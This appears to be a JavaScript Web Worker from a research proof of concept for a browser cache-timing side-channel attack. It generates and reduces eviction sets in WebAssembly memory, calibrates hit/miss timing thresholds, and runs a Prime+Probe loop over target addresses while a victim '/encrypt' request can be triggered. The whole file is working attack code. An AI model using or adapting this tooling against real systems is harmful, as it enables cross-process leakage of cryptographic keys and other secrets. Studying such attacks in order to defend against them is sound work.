function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function encrypt() {
    console.log("calling encrypt");
    fetch("/encrypt", { method: "POST" }).then(() =>
        console.log("encrypt done!"),
    );
}

let memDataView = null;

function getTime() {
    return memDataView.getUint32(0, true);
}

class EvictionSetGenerator {
    constructor(dataView, config) {
        this.config = config;
        this.candidatePoolPtr = config.page_size;
        this.candidatePoolSize = config.num_candidates * config.page_size;
        this.dataView = dataView;
    }
    JSTimedMiss(probe, evsetPtr) {
        var data, t1, t0;

        // prepare to traverse linked list
        // let evsetPtrInWasm = 128;
        // this.dataView.setUint32(0, probe, true);
        // access probe
        data = this.dataView.getUint32(probe, true);
        // traverse linked list
        while(evsetPtr) {
            evsetPtr = this.dataView.getUint32(evsetPtr, true);
        }
        // time access
        t0 = getTime()
        data = this.dataView.getUint32(probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    JSTimedHit(probe) {
        // time access
        var data, t1, t0;
        data = this.dataView.getUint32(probe, true);
        t0 = getTime()
        data = this.dataView.getUint32(probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    JSTimedAccess(probe) {
        var data, t1, t0;
        t0 = getTime()
        data = this.dataView.getUint32(probe, true);
        t1 = getTime();
        return t1 - t0;
    }
    JSEvict(evsetPtr) {
        // prepare to traverse linked list
        // let evsetPtrInWasm = 128;
        // this.dataView.setUint32(0, probe, true);
        // access probe
        // data = this.dataView.getUint32(probe, true);
        // traverse linked list
        while(evsetPtr) {
            evsetPtr = this.dataView.getUint32(evsetPtr, true);
        }
    }
    measureTimedMiss(timed_miss, probe, evsetPtr, num_measurements=this.config.num_measurements) {
        let t = 0;
        for (let i = 0; i < num_measurements; i++) {
            t += timed_miss(probe, evsetPtr);
        }
        return t / this.config.num_measurements;
    }
    setupLinkedList(indices) {
        if (indices.length == 0) {
            return;
        }
        let pre = indices[0];
        for (let i = 1; i < indices.length; i++) {
            this.dataView.setUint32(pre, indices[i], true);
            pre = indices[i];
        }
        this.dataView.setUint32(pre, 0, true);
        return indices[0];
    };
    getPageOffset(target) {
        target = target & ((this.config.page_size - 1) >>> 0);
        // to avoid unaligned memory access
        // target = target & ((~(4-1)) >>> 0)
        return target ? target : 0;
    }
    generateCandidateSet(target, timed_miss) {
        const pageOffset = this.getPageOffset(target);
        let evicted = false;
        let indices = new Array(this.config.num_candidates);
        for (let i = 0; i < indices.length; i++) indices[i] = this.candidatePoolPtr + (i * this.config.page_size) + pageOffset;
        do {
            for (let i = 0; i < indices.length; i++) {
                const to_swap = Math.floor(Math.random() * (indices.length));
                const tmp = indices[i];
                indices[i] = indices[to_swap];
                indices[to_swap] = tmp;
            }
            this.setupLinkedList(indices);
            if (target) {
                let t = this.measureTimedMiss(timed_miss, target, indices[0]);
                evicted = t >= this.config.threshold;
                if(!evicted) {
                    console.log(".")
                }
            }
        } while (target && !evicted);
        for (let i = 0; i < indices.length; i++) indices[i] -= pageOffset;
        return indices;
    };
    relinkChunk(evset, removedChunks) {
        const chunk = removedChunks.pop()
        // point last evset element to first chunk element
        this.dataView.setUint32(evset[evset.length-1], chunk[0], true);
        evset.push(...chunk)
    }
    unlinkChunk(evset, removedChunks, nchunks, chunk_idx) {
        nchunks = evset.length < nchunks ? evset.length : nchunks;
        const chunkSize = Math.floor(evset.length / nchunks);
        const isLastChunk = chunk_idx == (nchunks - 1);
        const chunkHead = chunkSize * chunk_idx;
        const thisChunkSize = isLastChunk ? evset.length - chunkHead : chunkSize;
        // skip this chunk
        if(chunk_idx != 0 ) {
            this.dataView.setUint32(evset[chunkHead - 1], isLastChunk ? 0 : evset[chunkHead + chunkSize], true);
        }
        const newChunk = evset.splice(chunkHead, thisChunkSize);
        removedChunks.push(newChunk);
        this.dataView.setUint32(newChunk[newChunk.length - 1], 0, true);
    }
    reduceToEvictionSet(timed_miss, candidates, probe) {
        const pageOffset = this.getPageOffset(probe);
        const nchunks = this.config.associativity + 1;
        let evset = Array.from(candidates);
        for(let i = 0; i < evset.length; i++) evset[i] += pageOffset;
        let removedChunks = [];
        let backtrackCounter = 0;
        let level = 0;
        for (let i = 0; i < evset.length; i++) {
            const to_swap = Math.floor(Math.random() * (evset.length - 1));
            const tmp = evset[i];
            evset[i] = evset[to_swap];
            evset[to_swap] = tmp;
        }
        this.setupLinkedList(evset);
        while(evset.length > this.config.associativity) {
            let found = false;
            let i = 0;
            for(; i < nchunks && !found; i++) {
                this.unlinkChunk(evset, removedChunks, nchunks, i);
                let t = this.measureTimedMiss(timed_miss, probe, evset[0]);
                if(t < this.config.threshold) {
                    this.relinkChunk(evset, removedChunks);
                } else {
                    console.log("-", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length, "chunk_idx removed:", i, "t:", t);
                    level++;
                    found = true;
                }
            }
            if(!found) {
                if(level && (!this.config.num_backtracks || backtrackCounter < this.config.num_backtracks)) {
                    backtrackCounter++;
                    this.relinkChunk(evset, removedChunks);
                    console.log("<", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length);
                    level--;
                    if(removedChunks.length == 0) {
                        console.log("|", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length);
                        return evset;
                    }
                } else {
                    while(removedChunks.length > 0) {
                        this.relinkChunk(evset, removedChunks);
                    }
                    console.log("!", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length);
                    return evset;
                }
            }
        }
        return evset;
    }
    generateConflictSet(evsets) {
        let set = new Set(evsets[0]);
        for(let i = 1; i < evsets.length; i++) {
            for(let j = 0; j < evsets[i].length; j++) {
                set.add(evsets[i][j]);
            }
        }
        const conflictSet = Array.from(set);
        this.setupLinkedList(conflictSet);
        return conflictSet;
    }
}

function mean(arr) {
        return arr.reduce((a,b) => a+b) / arr.length;
}

function median(arr) {
        arr.sort((a,b) => a-b);
        return (arr.length % 2) ? arr[(arr.length / 2) | 0] : mean([arr[arr.length/2 - 1], arr[arr.length / 2]]);
}

function thresholdCalibration(timed_miss, timed_hit, probe, evset, numMeasurements) {
    const hits = new Uint32Array(numMeasurements);
    const misses = new Uint32Array(numMeasurements);
    for(let i = 0; i < numMeasurements; i++) {
        misses[i] = timed_miss(probe, evset);
    }
    for(let i = 0; i < numMeasurements; i++) {
        hits[i] = timed_hit(probe);
    }
    // filter out 0s, these are clearly hits (usually there is a huge gap with no points in between)
    const hit_median = median(hits)
    const miss_median = median(misses.filter(x => x > 0))

    console.log("median hit found:", hit_median)
    console.log("median miss found:", miss_median)
    return ((2*hit_median) + miss_median)/3
}

self.onmessage = async (event) => {
    const { memory, utils, config } = event.data;
    // config.probe = [config.probe[0]]
    const wasmUtils = new WebAssembly.Instance(utils, {
        env: {
            memory: memory,
        },
    });
    memDataView = new DataView(memory.buffer);
    let evGenerator = new EvictionSetGenerator(memDataView, config);

    const timed_miss = wasmUtils.exports.timed_miss;
    const probe_loop = wasmUtils.exports.probe_loop;
    const probe = wasmUtils.exports.probe;
    const wait = wasmUtils.exports.wait;

    console.log("evGenerator created")
    let candidates = evGenerator.generateCandidateSet(config.probe[0], timed_miss);
    console.log("candidate set created with size: ", candidates.length);

    const evsets = new Array(config.probe.length);
    for(let i = 0; i < evsets.length; i++) {
        do {
            evsets[i] = evGenerator.reduceToEvictionSet(timed_miss, candidates, config.probe[i])
        } while(evsets[i].length > 12);
        console.log("evset[", i, "] created with size: ", evsets[i].length);
        evGenerator.setupLinkedList(evsets[i])
    }
    const conflictSet = evGenerator.generateConflictSet(evsets);
    console.log(conflictSet)
    console.log("conflict set created with size: ", conflictSet.length);


    const time_slot_size = config.time_slot_size
    const wait_cycles = config.wait_cycles;
    const num_addrs = config.probe.length;
    const targets = new Uint32Array(config.probe);
    const evset_bases = new Uint32Array(evsets.map(e => e[0]))
    const total_num_results = config.time_slots * config.probe.length;
    const resultsPtr = memDataView.byteLength - (total_num_results * 4);
    // copy evset bases and targets to memory
    const evsetsPtr = 64;
    const victimsPtr = 128;
    for(let i = 0; i < num_addrs; i++) {
        memDataView.setUint32(evsetsPtr + 4 * i, evset_bases[i], true)
        memDataView.setUint32(victimsPtr + 4 * i, targets[i], true)
    }
    const startTime = new Date();
    // encrypt();
    probe_loop(num_addrs, victimsPtr, evsetsPtr, resultsPtr, memDataView.byteLength, time_slot_size)
    // const results = new Uint32Array(total_num_results);
    // for(let i = 0; i < total_num_results; i += num_addrs) {
    //     for(let j = 0; j < num_addrs; j++) {
    //         // access(targets[j])
    //         // evict(evset_bases[j]);
    //         // results[i + j] = timed_miss(targets[j], evset_bases[j])
    //         results[i + j] = probe(targets[j], evset_bases[j]);
    //     }
    //     // evict(conflictSet[0]);
    //     wait(time_slot_size)
    // }
    const testTime = new Date(new Date() - startTime);
    console.log(`test took: ${testTime.getMinutes()} mins, ${testTime.getSeconds()} secs and ${testTime.getMilliseconds()} ms`)
    let numEvicted = 0
    const results = new Uint32Array(total_num_results);
    for(let i = 0; i < results.length; i++) {
        const value = memDataView.getUint32(resultsPtr + 4 * i, true)
        // results[i] =  value < config.threshold ? 1 : 0;
        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true) < config.threshold ? 1 : 0;
        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
        // results[i] = 30 > value && value < 40 ? 1 : 0;
        // results[i] = value < config.threshold ? 1 : 0;
        results[i] = value

        if(results[i] > config.threshold) numEvicted++;
    }
    console.log("numEvicted:", numEvicted)
    console.log("percentage evicted:", numEvicted / results.length)
    self.postMessage({results: results, config: config });
};
